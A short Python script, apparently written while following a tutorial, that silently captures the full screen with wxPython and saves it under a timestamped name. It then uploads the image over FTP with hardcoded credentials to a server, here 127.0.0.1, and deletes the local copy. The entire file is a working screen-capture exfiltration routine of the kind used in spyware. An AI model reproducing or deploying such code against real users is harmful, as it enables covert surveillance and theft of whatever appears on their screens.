# grabber.py

# Initial tutorial grabbed the screenshot to working directory and left it
# Updated script to delete the file after upload so it's not on GitHub -_-

# Initial tutorial was just a static file name screen capture
# Decided to research how to get a timestamped file name

import wx
import os
import ftplib
import time

w = wx.App()
screen = wx.ScreenDC()
size = screen.GetSize()
bmap = wx.Bitmap(size[0],size[1])
memo = wx.MemoryDC(bmap)
memo.Blit(0,0,size[0],size[1],screen,0,0)

timestamp = time.strftime("%Y-%m-%d-%H-%M-%S")

del memo
bmap.SaveFile(f"grabbed-{timestamp}.png", wx.BITMAP_TYPE_PNG)

sess_ = ftplib.FTP("127.0.0.1", "ftpuser", "ftpuser")
file_ = open(f"grabbed-{timestamp}.png", "rb")
sess_.storbinary(f"STOR grabbed-{timestamp}.png", file_)

file_.close()
sess_.quit()

os.unlink(f"grabbed-{timestamp}.png")